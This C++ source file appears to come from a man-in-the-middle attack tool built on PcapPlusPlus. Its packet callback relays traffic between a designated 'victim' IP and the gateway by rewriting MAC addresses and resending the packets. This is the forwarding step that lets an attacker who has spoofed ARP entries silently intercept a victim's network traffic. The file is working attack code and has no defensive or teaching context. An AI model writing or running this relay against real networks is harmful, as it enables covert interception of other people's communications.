//
// Created by dev on 7/10/25.
//

#include "../packet-receiver.hpp"

void ashk::PacketReceiver::onPacketArrivesMITMForwarding(pcpp::RawPacket *raw_packet, pcpp::PcapLiveDevice *dev,
                                                         void *cookie) {
    auto *data = static_cast<MITMForwardingCookie *>(cookie);
    pcpp::Packet packet(raw_packet);

    if (!packet.isPacketOfType(pcpp::Ethernet) && !packet.isPacketOfType(pcpp::IPv4) )
        return;

    auto eth_layer = packet.getLayerOfType<pcpp::EthLayer>();
    auto ip_layer = packet.getLayerOfType<pcpp::IPLayer>();
    if(ip_layer== nullptr)
        return;
    if(eth_layer->getSourceMac()==dev->getMacAddress()){
        return;
    }

    if (ip_layer->getSrcIPAddress()==data->victim_ip){
        eth_layer->setSourceMac(dev->getMacAddress());
        eth_layer->setDestMac(data->gateway_mac);
        dev->sendPacket(&packet);
        return;
    }
    if(ip_layer->getDstIPAddress()==data->victim_ip){
        eth_layer->setSourceMac(dev->getMacAddress());
        eth_layer->setDestMac(data->victim_mac);
        dev->sendPacket(&packet);
        return;
    }


}